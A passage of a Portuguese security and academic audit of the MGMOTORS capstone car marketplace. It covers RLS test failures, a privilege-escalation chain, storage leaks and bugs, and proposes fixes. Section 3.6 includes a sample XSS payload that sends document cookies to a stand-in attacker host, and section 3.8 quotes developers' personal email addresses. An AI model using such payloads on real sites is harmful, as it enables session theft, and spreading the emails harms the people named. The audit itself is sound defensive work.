# MGMOTORS — Diagnóstico completo, problemas e plano de correção

**Data:** 22/10/2026  
**Objeto:** repositório `PROJETOS/MGMOTORS`, deploy Vercel e artigo do TCC  
**Finalidade:** auditoria técnica e acadêmica para a banca (nov/2026)  
**Natureza:** análise e planejamento — nenhuma alteração de código, banco ou produção foi feita nesta etapa  
**Documento anterior preservado:** `ANALISE-BANCA.md` (697 linhas, não sobrescrito)  
**Documentos derivados:** `LEVANTAMENTOS-20261022.md` (achados verificados) e `PROXIMOS-PASSOS-20261022.md` (plano de execução)  
**Índice:** `INDICE-ANALISES.md`

---

## Como ler este documento

Cada achado recebe um dos quatro rótulos abaixo. A diferença entre eles é importante para não transformar suspeita em fato:

| Rótulo | Significado |
|---|---|
| **CONFIRMADO** | Reproduzido no código atual ou no ambiente de produção em 22/10/2026. |
| **CORRIGIDO NO REPO** | Existe alteração no repositório que resolve o ponto, mas ela ainda não foi aplicada/validada no deploy. |
| **PENDENTE** | Problema real, ainda sem correção no repositório nem em produção. |
| **NÃO REPRODUZIDO** | A versão anterior da auditoria afirmava o problema, mas o código/schema atual não sustenta a afirmação. |

Convenções:

- **P0** = bloqueia demonstração, segurança ou integridade do artigo.
- **P1** = prejudica a experiência ou a defesa, mas tem contorno.
- **P2** = melhoria desejável, não essencial para a banca.
- Linhas de código citadas são as do repositório no commit `aa3b38e` (branch `main`, 55 commits).

---

## Sumário

1. [Veredito executivo](#1-veredito-executivo)
2. [Estado do repositório e do deploy](#2-estado-do-repositório-e-do-deploy)
3. [Segurança e banco de dados](#3-segurança-e-banco-de-dados)
4. [Defeitos funcionais, UX e acessibilidade](#4-defeitos-funcionais-ux-e-acessibilidade)
5. [Matriz de casos de uso e requisitos](#5-matriz-de-casos-de-uso-e-requisitos)
6. [Artigo × código: integridade acadêmica](#6-artigo--código-integridade-acadêmica)
7. [Plano de correção priorizado](#7-plano-de-correção-priorizado)
8. [Patches recomendados](#8-patches-recomendados)
9. [Checklist de evidências para a banca](#9-checklist-de-evidências-para-a-banca)
10. [O que não fazer](#10-o-que-não-fazer)
11. [Riscos residuais e perguntas abertas](#11-riscos-residuais-e-perguntas-abertas)
12. [Anexo A — comandos de verificação](#anexo-a--comandos-de-verificação)

---

## 1. Veredito executivo

### 1.1 O que está sólido

O MGMOTORS é um projeto **acima da média para um curso técnico**. Isso não é elogio genérico: a base tem qualidades verificáveis.

- **Escopo real, não maquete.** Cadastro, login, recuperação de senha, publicação de anúncio com fotos, busca, filtros, favoritos, curtidas, mensagens internas, perfil público, denúncias, moderação e painel administrativo existem em código e conversam com um banco PostgreSQL real.
- **Modelagem consistente.** O schema tem entidades centrais bem separadas (`usuarios`, `anuncios`, `marcas`, `modelos`, `fotos_anuncio`, `favoritos`, `curtidas_anuncio`, `mensagens`, `conversas`, `denuncias`, `seguidores`, `config_usuario`), chaves estrangeiras, triggers e RLS.
- **Preocupação legítima com segurança.** Há policies, funções `SECURITY DEFINER`, triggers de proteção de campos sensíveis, consentimento legal versionado e um roteiro de teste de RLS. Poucos TCCs chegam a esse nível.
- **Documentação de casos de uso.** `MG-CASOS-USO/como-utilizar.html` descreve 25 UCs com fluxos e exceções. É material de defesa valioso.
- **Artigo com estrutura acadêmica adequada.** Problema, objetivos, fundamentação, metodologia, resultados, limitações e trabalhos futuros estão presentes. O texto do `professor` já reconhece que notificações não funcionaram — o que é honesto e defensável.
- **Deploy funcionando.** `https://mgmotorss.vercel.app` está no ar e responde corretamente à API de configuração.

### 1.2 O que ameaça a banca

Três riscos concentram quase todo o perigo. Nenhum exige reescrever o projeto; todos exigem correção antes da apresentação.

**Risco 1 — Segurança incompleta e hardening não aplicado (P0).**  
O teste de RLS contra produção continua em **17 PASS / 4 FAIL**. Quatro falhas permitem: ler avaliações privadas, ler fotos de anúncios pausados/rejeitados, executar `promover_moderador` como anônimo e executar `criar_tabela_carrinho` como anônimo. A migration de correção existe, mas está **não versionada e não aplicada**, e ainda contém um erro de nome de policy que deixa dois uploads permissivos abertos. Se a banca rodar o próprio script ou pedir para rodá-lo, o resultado é desconfortável.

**Risco 2 — O artigo afirma funcionalidades que o código não tem (P0 acadêmico).**  
UC09 (editar anúncio), UC15 (gerenciar categorias), UC20 (marcar como vendido), UC21 (notificações persistentes), UC24 (compartilhar) e UC25 (formulário de contato) aparecem no texto e/ou no Quadro 3 como implementados, mas não existem no código. O Quadro 6 marca como PASS cenários que incluem UCs ausentes. Isso é o tipo de inconsistência que uma banca técnica encontra em minutos.

**Risco 3 — Bugs que quebram a demonstração ao vivo (P1).**  
Os mais visíveis: links de navegação quebrados nas páginas de blog, `?categoria=` e `?anunciar=1` ignorados na home, aba “Pausados” inalcançável, aprovação de anúncio que ignora erro, feedback de moderação invisível por falta de CSS do toast, e configuração central que derruba todas as páginas se `/api/config` falhar.

### 1.3 Recomendação central

**Não adicionar funcionalidades novas antes da banca.** O caminho de maior retorno é:

1. corrigir e **aplicar** o hardening de segurança;
2. consertar os bugs de demonstração;
3. **reduzir as alegações do artigo** ao que existe, em vez de implementar tudo o que o artigo promete;
4. substituir as figuras que são mockups por capturas reais;
5. ensaiar a demo com um roteiro que só use fluxos comprovadamente funcionais.

Implementar UC09, UC20, UC21, UC24 e UC25 em cinco semanas é possível, mas aumenta o risco de regressão e desvia energia do que a banca realmente cobra: coerência, segurança e domínio do próprio trabalho.

### 1.4 Nota de maturidade (uso interno, não para o artigo)

| Dimensão | Avaliação | Comentário |
|---|---|---|
| Funcionalidade demonstrada | Boa | Fluxos centrais funcionam; bordas falham. |
| Segurança | Regular | Boa intenção, execução incompleta; 4 falhas ativas. |
| Qualidade de código | Regular | HTML/JS concentrado, sem build, sem testes automatizados. |
| Documentação | Boa | UCs e README extensos; faltam evidências de teste. |
| Artigo | Regular | Boa estrutura, mas overclaim de funcionalidades. |
| Prontidão para banca | **Média** | Defensável após 2–3 semanas de correções focadas. |

---

## 2. Estado do repositório e do deploy

### 2.1 Repositório

| Item | Valor |
|---|---|
| Branch | `main` |
| Commits | 55 |
| Último commit | `aa3b38e` — `fix: harden legal consent and account flows` (08/10/2026) |
| HTML | 25 arquivos, 8.522 linhas |
| CSS | 22 arquivos, 8.138 linhas |
| JS | 6 arquivos, 618 linhas |
| SQL | 6 arquivos, 8.512 linhas |
| Arquivos não versionados | `ANALISE-BANCA.md`, 3 `.docx`, migration de hardening, `supabase/snapshots/`, `supabase/tests/` |

O repositório está limpo quanto a arquivos rastreados. O que existe de não versionado é material de auditoria e entrega — não lixo. Ainda assim, **a migration de hardening e os testes precisam entrar no Git** antes da banca, senão a correção não tem histórico nem rastreabilidade.

### 2.2 Deploy: dois domínios, dois aplicativos diferentes

Este é um achado que precisa ser resolvido antes de qualquer divulgação do trabalho.

| Domínio | O que serve | `/api/config` | Situação |
|---|---|---|---|
| `https://mgmotorss.vercel.app` | Aplicativo MGMOTORS real | JSON válido | **Correto** |
| `https://mgmotors.vercel.app` | Aplicativo Angular não relacionado | HTML (não JSON) | **Errado** |
| `https://mgmotors-zeta.vercel.app` | Redireciona para `mgmotorss` | — | Aceitável |

Consequências:

- **21 arquivos HTML** ainda declaram `rel="canonical"` para `https://mgmotors.vercel.app`. Ou seja, o SEO aponta para o aplicativo errado.
- Se a banca abrir o link do artigo ou do README e cair no domínio antigo, verá outra aplicação.
- O `mgConfig.js` chama `/api/config` por caminho relativo. No domínio errado, recebe HTML e falha — o que, combinado com o `throw` de topo, derruba a página inteira.

**Correção mínima:** padronizar **um** domínio oficial (`mgmotorss.vercel.app`), trocar todos os canonicals e remover ou redirecionar o domínio antigo. Se houver domínio próprio, melhor ainda: um único endereço, com redirect 308 dos demais.

**Comando de auditoria:**

```bash
grep -rl 'https://mgmotors.vercel.app' --include='*.html' . | wc -l   # 21
grep -rho 'rel="canonical" href="[^"]*"' --include='*.html' . | sort | uniq -c
```

### 2.3 Discrepância entre documentação e código

O `README.md` e o artigo descrevem um produto mais completo do que o código atual. Isso não é incomum em TCC, mas precisa ser tratado como **risco de integridade**, não como detalhe. A seção 6 detalha item por item.

---

## 3. Segurança e banco de dados

### 3.1 Resultado empírico do teste de RLS

Execução de 22/10/2026 contra produção (`ilswwmjojfuvcgyymymb.supabase.co`), usando a chave pública, **somente as seções [1]–[4]** do script (as seções [5]–[7] são destrutivas — ver 3.8):

```
17 PASS / 4 FAIL
```

| # | Verificação | Esperado | Obtido | Status | Impacto |
|---|---|---|---|---|---|
| S1 | `anon SELECT avaliacoes` | vazio | retorna linhas | **CONFIRMADO / FAIL** | Expõe `avaliador_id` e `avaliado_id`: quem avaliou quem, com nota. Dado relacional privado. |
| S2 | `anon SELECT fotos_anuncio` | ≤ fotos de anúncios ativos | 49 fotos vs 4 anúncios ativos | **CONFIRMADO / FAIL** | Fotos de anúncios pausados, rejeitados ou invisíveis continuam públicas. |
| S3 | `anon RPC promover_moderador` | 400/401/403 | HTTP 204 | **CONFIRMADO / FAIL** | Função `SECURITY DEFINER` com `GRANT` para `anon`. O guard `auth.uid() IS NOT NULL` não protege anônimo, porque `auth.uid()` é `NULL`. |
| S4 | `anon RPC criar_tabela_carrinho` | 400/401/403/404 | HTTP 204 | **CONFIRMADO / FAIL** | DDL executável por anônimo. Cria tabela em runtime; superfície de abuso e de inconsistência de schema. |

As outras 17 verificações passaram: leitura anônima de `usuarios`, `usuarios_banidos`, `mensagens` e `config_usuario`; escrita anônima em curtidas, usuários, anúncios, fotos, avaliações e comunidade; e storage anônimo.

**Leitura correta do resultado:** o projeto **não está “todo aberto”**. A maior parte do RLS funciona. Mas quatro falhas são suficientes para uma demonstração de escalação de privilégio e vazamento de dados. É melhor corrigir e apresentar “21/21” do que explicar “17/21” na banca.

### 3.2 A cadeia de escalação de privilégio

A falha mais grave não é uma das quatro acima isoladamente; é a combinação que o script explora na seção [6]:

1. O usuário autenticado pode **deletar o próprio perfil** em `public.usuarios`.
2. Em seguida, pode **inserir um novo perfil** com `moderador = true` e `is_admin = true`.
3. A função `is_admin()` passa a retornar `true`.
4. O usuário agora acessa o painel administrativo, modera anúncios, bane contas e lê dados que não deveria.

A migration de hardening fecha isso em três camadas:

- policy de `INSERT` exige `id = auth.uid()` e força as flags para `false`;
- trigger `BEFORE INSERT` reescreve as flags mesmo que a policy seja afrouxada;
- trigger `BEFORE UPDATE` protege `is_admin`, `bloqueado`, `email`, `nota_media` e `total_avaliacoes`.

**Status:** **PENDENTE** — a migration existe, mas não foi aplicada.

### 3.3 A migration de hardening: o que ela cobre e onde falha

Arquivo: `supabase/migrations/20261020120000_security_hardening.sql` (596 linhas, não versionado, não aplicado).

**Cobertura declarada e verificada no arquivo:**

| Bloco | O que faz | Situação |
|---|---|---|
| 0 | Aborta se houver e-mail duplicado | OK |
| 1 | Fecha `INSERT`/`UPDATE` em `usuarios`, adiciona FK para `auth.users` | OK |
| 2 | Revoga `promover_moderador`, remove `criar_tabela_carrinho`, recria `carrinho_itens`, fixa `search_path` | OK, com ressalva em 3.4 |
| 3 | Remove leitura anônima de `avaliacoes` | OK |
| 4 | Remove policy pública que anulava a checagem de `fotos_anuncio` | OK |
| 5 | Separa policies `FOR ALL USING (true)` de curtidas | OK |
| 6 | Restringe conversas/mensagens ao participante | OK |
| 7 | Reescreve policies de storage exigindo dono no caminho | **Incompleto** |
| 8 | Mantém `usuarios_publicos` como `SECURITY DEFINER` | Intencional e documentado |
| 9 | Bloco de verificação final que aborta a transação | OK |

**Falha concreta:** na seção 7, a migration executa:

```sql
DROP POLICY IF EXISTS "fc_insert" ON storage.objects;
DROP POLICY IF EXISTS "fg_insert" ON storage.objects;
```

Mas as policies reais em produção são **`fc_upload`** e **`fg_upload`**, não `fc_insert`/`fg_insert`. Resultado: os dois `DROP` são no-ops silenciosos, e as policies permissivas continuam valendo:

```sql
-- produção, snapshot 20261020
CREATE POLICY "fc_upload" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'FOTOS-COMUNIDADE');

CREATE POLICY "fg_upload" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'FOTOS-GARAGEM');
```

Qualquer usuário autenticado pode enviar arquivo para esses buckets sem checar o dono do caminho. O bloco de verificação final da migration **não valida esses nomes**, então a migration pode ser aplicada com sucesso e ainda deixar o buraco aberto.

**Correção exata:**

```sql
DROP POLICY IF EXISTS "fc_upload" ON storage.objects;
DROP POLICY IF EXISTS "fg_upload" ON storage.objects;
```

E, se o desenho for “cada usuário só escreve na própria pasta”:

```sql
CREATE POLICY "fc_upload_dono" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (
    bucket_id = 'FOTOS-COMUNIDADE'
    AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
  );

CREATE POLICY "fg_upload_dono" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (
    bucket_id = 'FOTOS-GARAGEM'
    AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
  );
```

**Antes de aplicar:** confirmar o formato real dos caminhos usados pelo frontend nesses dois buckets. Se o primeiro segmento não for o UID, a policy correta precisa usar o índice adequado. Não aplicar às cegas.

**Validação que deve entrar no bloco final:**

```sql
DO $$
BEGIN
  IF EXISTS (
    SELECT 1 FROM pg_policies
    WHERE schemaname = 'storage'
      AND tablename  = 'objects'
      AND policyname IN ('fc_upload', 'fg_upload')
  ) THEN
    RAISE EXCEPTION 'Hardening incompleto: policies fc_upload/fg_upload ainda existem.';
  END IF;
END
$$;
```

### 3.4 O que a migration não resolve

É importante não vender a migration como solução universal. Ela **não** resolve:

- XSS por URL de imagem (seção 3.6);
- bucket público de fotos de chat (seção 3.5);
- oráculo de curtidas em `get_anuncios_marketplace` (seção 3.7);
- toggles de privacidade que o frontend exibe mas o banco não aplica;
- funcionalidades ausentes do artigo (seção 6);
- exposição de e-mails de desenvolvedores no frontend (seção 3.8);
- ausência de rate limiting e de proteção contra abuso de upload;
- testes automatizados de regressão.

### 3.5 Storage: buckets, policies e o caso das fotos de chat

O schema de produção tem 28 policies em `storage.objects`. A maioria checa **apenas `bucket_id`**, não o dono do caminho. Isso significa que qualquer usuário autenticado pode sobrescrever ou apagar arquivos de terceiros no mesmo bucket, dependendo da operação.

O caso mais sensível é o chat:

```js
// MG-MENSAGENS/mensagens.html:533-537
const caminho = `mensagens/${usuarioAtual.id}/${Date.now()}.${ext}`;
const { error } = await supabase.storage.from('FOTOS-ANUNCIOS').upload(caminho, file);
const { data: urlData } = supabase.storage.from('FOTOS-ANUNCIOS').getPublicUrl(caminho);
```

Problemas:

1. Fotos de conversa privada vão para o mesmo bucket público dos anúncios (`FOTOS-ANUNCIOS`).
2. O caminho começa com `mensagens/`, mas a policy de leitura só verifica `bucket_id = 'FOTOS-ANUNCIOS'`.
3. `getPublicUrl` gera URL pública. **URL pública de bucket público não passa por RLS** — quem tiver o link acessa, mesmo sem login, mesmo sem participar da conversa.
4. Não há política que relacione o arquivo à conversa.

**Impacto:** vazamento de imagens privadas por link. Para a banca, é um exemplo clássico de “RLS no banco não protege objeto público no storage”.

**Correção recomendada (P1):**

- criar bucket privado `mensagens`;
- caminho `conversa/<conversa_id>/<uid>/<arquivo>`;
- policy de `INSERT` exigindo `uid = auth.uid()` e participação na conversa;
- policy de `SELECT` exigindo participação na conversa;
- trocar `getPublicUrl` por `createSignedUrl` com expiração curta.

Se o tempo apertar, a alternativa mínima é **não permitir upload de foto no chat** na versão da banca. É melhor remover uma funcionalidade do que defender vazamento.

### 3.6 XSS por URL de imagem

Há interpolação de dados do banco em `innerHTML` sem escape em vários pontos. O `mgConfig.js` já exporta `escapeHtml`, e algumas páginas o usam — mas justamente as mais críticas não.

| Arquivo | Linha | Campo | Vetor |
|---|---|---|---|
| `MG-MARKETPLACE/marketplace.html` | 593 | `anuncio.foto_principal` em `src="..."` | Quebra de atributo com `"` + `onerror` |
| `MG-MARKETPLACE/marketplace.html` | 603 | `anuncio.vendedor_foto` em `src="..."` | Idem |
| `MG-INICIO/inicio.html` | 414 | `foto` em `src="..."` | Idem |
| `MG-CONTA/conta.html` | 406 | `foto` em `src="..."` (cards pausados) | Idem |
| `MG-CONTA/conta.html` | 431 | `foto` em `src="..."` (anúncios de outro usuário) | Idem |
| `MG-DEV/devpanel.html` | 406, 460, 470, 481, 558, 601 | fotos de anúncio, denunciante, alvo, usuário | Idem |

Um anúncio com `foto_principal = x" onerror="fetch('https://atacante/?c='+document.cookie)` executa script no navegador de quem visualiza a listagem. Em uma demo, isso é trivial de mostrar — e trivial de explorar.

**Correção:** importar `escapeHtml` de `mgConfig.js` e aplicá-lo a **todo** valor interpolado em atributo, não só a texto. Para URLs de imagem, adicionalmente validar o protocolo:

```js
function safeImageUrl(url, fallback = "../imagens/image.webp") {
  try {
    const u = new URL(url, location.href);
    if (u.protocol !== "http:" && u.protocol !== "https:") return fallback;
    return escapeHtml(u.href);
  } catch {
    return fallback;
  }
}
```

Observação: `escapeHtml` sozinho resolve a quebra de atributo. A validação de protocolo é defesa extra contra `data:` e `javascript:`.

### 3.7 RPC `get_anuncios_marketplace`: oráculo de curtidas e ausência de paginação

A função é `SECURITY DEFINER`, recebe `usuario_id_param` arbitrário e tem `GRANT EXECUTE` para `PUBLIC`, `anon` e `authenticated`. Ela retorna todos os anúncios ativos com `usuario_id`, coordenadas, foto do vendedor e um campo calculado:

```sql
CASE
  WHEN usuario_id_param IS NULL THEN FALSE
  ELSE EXISTS (
    SELECT 1 FROM public.curtidas_anuncio ca
    WHERE ca.anuncio_id = a.id
      AND ca.usuario_id = usuario_id_param
  )
END AS usuario_curtiu
```

Como o parâmetro não é confrontado com `auth.uid()`, **qualquer pessoa pode passar o UUID de outra pessoa** e descobrir quais anúncios ela curtiu. Isso é um oráculo de comportamento, não apenas um dado público.

Além disso:

- a função não tem `LIMIT`/paginação; retorna a tabela inteira;
- não tem `search_path` fixo (a migration corrige isso, mas não o resto);
- ignora o RLS de `usuarios` ao expor a foto do vendedor.

**Correção recomendada:**

```sql
-- usar always o uid do chamador, nunca um parâmetro livre
ALTER FUNCTION public.get_anuncios_marketplace(uuid) RENAME TO get_anuncios_marketplace_legacy;

CREATE OR REPLACE FUNCTION public.get_anuncios_marketplace(p_limit int DEFAULT 40, p_offset int DEFAULT 0)
RETURNS TABLE (...)  -- mesmas colunas
LANGUAGE sql
SECURITY DEFINER
SET search_path TO 'public', 'pg_temp'
AS $$
  SELECT ...
  FROM public.anuncios a
  ...
  WHERE a.status = 'ativo' AND coalesce(a.pausado, false) = false
  ORDER BY a.criado_em DESC
  LIMIT least(greatest(p_limit, 1), 100)
  OFFSET greatest(p_offset, 0);
$$;
```

E `usuario_curtiu` deve usar `auth.uid()` internamente, não parâmetro. Se a mudança de assinatura for grande para a banca, a correção mínima é **ignorar o parâmetro** e usar `(SELECT auth.uid())`.

### 3.8 Exposição de e-mails e lógica de admin no frontend

| Arquivo | Linha | Conteúdo |
|---|---|---|
| `MG-DEV/devpanel.html` | 273 | `const ADMIN_EMAILS = ['murilofrank157@gmail.com'];` |
| `MG-DEV/devpanel.html` | 325 | E-mail de admin pré-preenchido no formulário de login |
| `MG-CONFIGURACOES/configuracoes.html` | 245 | `DEVS = ["murilofrank157@gmail.com", "guilhermefrankadami@gmail.com", "candidomurilo809@gmail.com"]` |

O e-mail sozinho não concede acesso — a autorização real está em `is_admin()` no banco. Mas:

- expõe dados pessoais no HTML público;
- revela a lógica de decisão do painel;
- o pré-preenchimento é um cheiro de segurança e um problema de LGPD;
- se a banca abrir “Exibir código-fonte”, isso aparece.

**Correção:** remover a lista do frontend e consultar `is_admin()` via RPC. O formulário não deve pré-preencher e-mail de admin.

### 3.9 O script de teste de RLS é destrutivo

`supabase/tests/rls-security-check.sh` é útil, mas **não pode ser executado inteiro contra produção**. A seção [6] faz:

```bash
before=$(body "/rest/v1/usuarios?select=id&limit=1" auth)
curl -X DELETE "$URL/rest/v1/usuarios?id=eq.$AUTH_UID" ...
admin_code=$(auth POST "/rest/v1/usuarios" "{...moderador:true...}")
...
curl -X DELETE "$URL/rest/v1/usuarios?id=eq.$AUTH_UID" ...
```

Problemas:

1. Deleta o perfil do usuário de teste.
2. Nunca o recria com os dados originais.
3. `before` é capturado e **não é usado**.
4. O comentário afirma que “restaura o perfil ao final”, o que é falso.
5. Se o `INSERT` for bloqueado pela correção, o perfil **continua deletado**.
6. Rodar isso com uma conta real destrói o perfil e pode quebrar o login (a conta existe em `auth.users`, mas o perfil some).

**Regra:** nunca rodar `[5]`, `[6]` ou `[7]` contra produção. Usar:

- um projeto Supabase local (`supabase start`) ou um projeto de staging descartável;
- um usuário de teste criado via Admin API;
- `trap` de limpeza;
- restauração real do perfil, com os valores de `before`.

Exemplo de correção estrutural:

```bash
cleanup() {
  if [ -n "${AUTH_UID:-}" ]; then
    # recria o perfil a partir do JSON capturado antes do teste
    curl -s -X POST "$URL/rest/v1/usuarios" \
      -H "apikey: $SERVICE_KEY" -H "Authorization: Bearer $SERVICE_KEY" \
      -H "Content-Type: application/json" \
      -d "$before" >/dev/null
  fi
}
trap cleanup EXIT
```

Mas o correto é **não** usar `service_role` no script de teste de RLS; usar um ambiente descartável. O script deve ser declarado como “staging only” no cabeçalho, com aviso em vermelho.

### 3.10 Privacidade: toggles que não aplicam

O frontend exibe opções de privacidade (perfil, mensagens, localização), mas não há evidência de que o banco aplique essas preferências nas policies. Isso significa que o usuário acredita controlar algo que o sistema não controla.

**Status:** **PENDENTE** — verificar `config_usuario` e as policies de `usuarios`, `mensagens` e `anuncios`. Se não houver aplicação, remover os toggles da interface antes da banca é mais honesto do que mantê-los decorativos.

### 3.11 Outros pontos de segurança

| Ponto | Status | Observação |
|---|---|---|
| Rate limiting em login/cadastro/denúncia | **PENDENTE** | Supabase tem proteções básicas, mas não há limite de aplicação. |
| Validação de tamanho/tipo de upload | **PENDENTE** | Depende do bucket; verificar limites. |
| CSP e headers de segurança | **PENDENTE** | `vercel.json` não define CSP, `X-Frame-Options` etc. |
| Dependências CDN sem SRI | **PENDENTE** | `esm.sh`, Lucide e Chatling vêm de terceiros. |
| Service role key no frontend | **NÃO REPRODUZIDO** | Apenas a chave pública é exposta, como esperado. |
| Bucket `fotos-perfil` público | **CONFIRMADO** | Fotos de perfil são públicas por desenho; aceitável se o usuário souber. |
| `usuarios_publicos` como `SECURITY DEFINER` | **CONFIRMADO, intencional** | Expõe só colunas de apresentação. Não adicionar e-mail/telefone. |

---

## 4. Defeitos funcionais, UX e acessibilidade

### 4.1 Bugs que quebram a demonstração

| # | Defeito | Evidência | Status | Impacto | Correção |
|---|---|---|---|---|---|
| F01 | Links do header quebram nas páginas de blog | `headerGlobal.js:35` usa `../MG-DICAS/dicas.html`; blogs estão em `MG-DICAS/blogs/<marca>/<arquivo>.html` (3 níveis) | **CONFIRMADO** | Clicar em “Dicas” a partir de um blog leva a 404 | Usar caminho absoluto `/MG-DICAS/dicas.html` |
| F02 | `?categoria=` ignorado | `inicio.html:82-106` envia `?categoria=esportivos` etc.; `marketplace.html` só lê `carro` (`:476,496`) | **CONFIRMADO** | Categorias da home não filtram nada | Ler `categoria` e mapear para `tipo_veiculo`/tag |
| F03 | `?anunciar=1` ignorado | `inicio.html:52,257` envia `?anunciar=1`; marketplace não lê | **CONFIRMADO** | “Anunciar Agora” não abre o modal | Abrir `modal-add-car` se logado; senão, login |
| F04 | Aba “Pausados” inalcançável | `conta.html:67-69` tem abas `dados`, `anuncios`, `fotos`; `#tab-pausados` existe em `:103`, mas não há botão `data-tab="pausados"` | **CONFIRMADO** | Anúncios pausados ficam sem UI de gestão | Adicionar botão ou remover a aba |
| F05 | Aprovação de anúncio ignora erro | `devpanel.html:418-421`: `await db.from("anuncios").update(...)` sem checar `.error` | **CONFIRMADO** | UI diz “aprovado” mesmo se o RLS bloqueou | Checar `{ error }` antes do toast |
| F06 | Feedback de moderação invisível | `devpanel.css` não é linkado; não existe regra `.toast` em nenhum CSS | **CONFIRMADO** | Toasts de aprovar/rejeitar/banir não aparecem | Linkar CSS ou estilizar `.toast` inline |
| F07 | Configuração central derruba todas as páginas | `mgConfig.js:12-21` lança erro no topo do módulo se `/api/config` falhar | **CONFIRMADO** | Um deploy sem env vars deixa o site inteiro em branco | Fallback + tela de erro amigável |
| F08 | Chat não resolve nome/foto de terceiros | `mensagens.html:221,280,413` lê `usuarios` diretamente; policy é `select proprio ou admin` | **CONFIRMADO** | Conversas mostram “Usuário”/avatar quebrado | Usar `usuarios_publicos` |
| F09 | `conta.html` também lê `usuarios` direto | `conta.html:457` | **CONFIRMADO** | Dados de outro perfil podem não carregar | Usar `usuarios_publicos` |
| F10 | Busca sem debounce | `marketplace.html:813` chama `aplicarFiltroOrdenacao()` a cada tecla | **CONFIRMADO** | Filtragem/paginação a cada caractere; sensação de travamento | Debounce de 250–300 ms |
| F11 | `.toLocaleString()` em `quilometragem` sem guarda | `conta.html:406,431` | **NÃO REPRODUZIDO** com o schema atual (`NOT NULL`) | Se vier `null` de RPC/legado, quebra o card | Guarda defensiva `Number(a.quilometragem || 0)` |
| F12 | “Reativar anúncio” quebrado em geral | `conta.html:403` | **NÃO REPRODUZIDO** | Anúncios pausados normalmente mantêm `status='ativo'`; rejeitados escondem o botão | O problema real é a aba inalcançável (F04), não o botão |
| F13 | `devpanel.css` “morto” | Não há `<link>` para ele | **CONFIRMADO, impacto limitado** | A maior parte do CSS do painel é inline; o que falta é o toast (F06) | Linkar ou remover o arquivo |
| F14 | Sem foco/teclado em modais | Nenhum `role="dialog"`, `aria-modal`, focus trap, ESC ou `tabindex` | **CONFIRMADO** | Acessibilidade ruim; Tab escapa do modal | Implementar padrão de diálogo |
| F15 | Consentimento pode ser dispensado | Banner permite “Agora não”; só “Aceitar” entra em loop se RPC falhar | **CONFIRMADO** | Aceite legal não é garantido | Bloquear uso até aceite ou registrar recusa |
| F16 | `usuarios_publicos` não cobre todos os usos | Chat e conta ainda usam `usuarios` | **CONFIRMADO** | Ver F08/F09 | Migrar leituras |
| F17 | Upload de chat em bucket público | `mensagens.html:533-537` | **CONFIRMADO** | Ver 3.5 | Bucket privado + signed URL |
| F18 | Falta de paginação em `get_anuncios_marketplace` | Função sem `LIMIT` | **CONFIRMADO** | Carrega todos os anúncios ativos | Paginação server-side |
| F19 | Artigo usa “MGMOTORSBR” em uma variante | `ArtigoMG_revisado_MGMOTORSBR.docx` | **CONFIRMADO** | Marca inconsistente | Escolher uma variante canônica |
| F20 | Canonicals no domínio errado | 21 arquivos | **CONFIRMADO** | Ver 2.2 | Trocar domínio |

### 4.2 Acessibilidade

O projeto tem boa semântica em várias páginas, mas os modais são o ponto fraco:

- nenhum modal tem `role="dialog"` ou `aria-modal="true"`;
- não há focus trap;
- ESC não fecha;
- o foco não retorna ao elemento que abriu o modal;
- botões de ícone às vezes não têm `aria-label`;
- contraste de texto secundário precisa ser verificado;
- o banner de consentimento é o único elemento com `role="dialog"`, e usa `aria-modal="false"` — o que não bloqueia interação.

Para a banca, vale corrigir pelo menos o modal de publicação e o de visualização, porque são os que aparecem na demo.

### 4.3 Desempenho e arquitetura

- **N+1 no chat e na conta:** loops que fazem uma consulta por anúncio/conversa. Em base pequena não aparece; em demo com rede lenta, aparece.
- **Filtragem client-side:** o marketplace carrega todos os anúncios e filtra no navegador. Funciona para 4 anúncios, não escala.
- **Sem build/bundler:** HTML com scripts inline, imports via CDN. Simples, mas sem minificação, cache busting ou tree shaking.
- **Sem testes automatizados:** o único teste é o script de RLS, que é manual e destrutivo.
- **`search_path` em funções `SECURITY DEFINER`:** a migration corrige as principais; verificar se restou alguma.

Nada disso é bloqueador para um TCC. Mas o artigo não deve afirmar “desempenho satisfatório” sem medir.

---

## 5. Matriz de casos de uso e requisitos

### 5.1 Legenda

- **Implementado** — fluxo completo no código.
- **Parcial** — existe, mas falta parte relevante ou há bug.
- **Não implementado** — não existe no código.
- **Não verificado** — não foi possível confirmar sem teste manual.

### 5.2 Matriz dos 25 UCs

| UC | Nome | Status | Evidência / lacuna | Ação para a banca |
|---|---|---|---|---|
| UC01 | Cadastrar usuário | Implementado | `register.html`, trigger `handle_new_user` | Manter |
| UC02 | Realizar login | Implementado | `login.html` | Manter |
| UC03 | Recuperar senha | Implementado | Fluxo Supabase | Testar com e-mail real |
| UC04 | Pesquisar veículos | **Parcial** | Texto, tipo, marca, preço, estado; faltam ano, modelo, km, combustível, câmbio, cor | Não alegar filtros estendidos |
| UC05 | Visualizar detalhes | Implementado | Modal de detalhes | Manter |
| UC06 | Favoritar | Implementado | `favoritos` | Manter |
| UC07 | Contatar vendedor | Implementado | WhatsApp + mensagem interna | Manter; separar de UC25 |
| UC08 | Publicar anúncio | Implementado | Modal + upload | Manter |
| UC09 | Editar anúncio | **Não implementado** | Nenhum botão/fluxo de edição | Remover do artigo ou implementar |
| UC10 | Excluir anúncio | Implementado | Botão excluir | Manter |
| UC11 | Gerenciar meus anúncios | **Parcial** | Lista + excluir + reativar; sem editar; aba pausados inalcançável | Corrigir F04; ajustar texto |
| UC12 | Denunciar anúncio | Implementado | `denuncias` + painel | Manter |
| UC13 | Administrar usuários | **Parcial** | Buscar/banir/desbanir; sem editar dados | Ajustar RF09 |
| UC14 | Moderar anúncios | **Parcial** | Aprovar/rejeitar; aprovação ignora erro; sem justificativa persistida | Corrigir F05; ajustar RF10 |
| UC15 | Gerenciar categorias | **Não implementado** | Categorias existem no banco/filtro, sem CRUD | Remover do artigo |
| UC16 | Painel administrativo | **Parcial** | Dashboard e listas; sem relatórios/exportação | Ajustar RF12 |
| UC17 | Gerenciar perfil | Implementado | Edição de nome, foto, capa, bio, redes | Manter |
| UC18 | Alterar senha | Implementado | Supabase auth | Manter |
| UC19 | Ver perfil do vendedor | Implementado | `usuarios_publicos` | Manter |
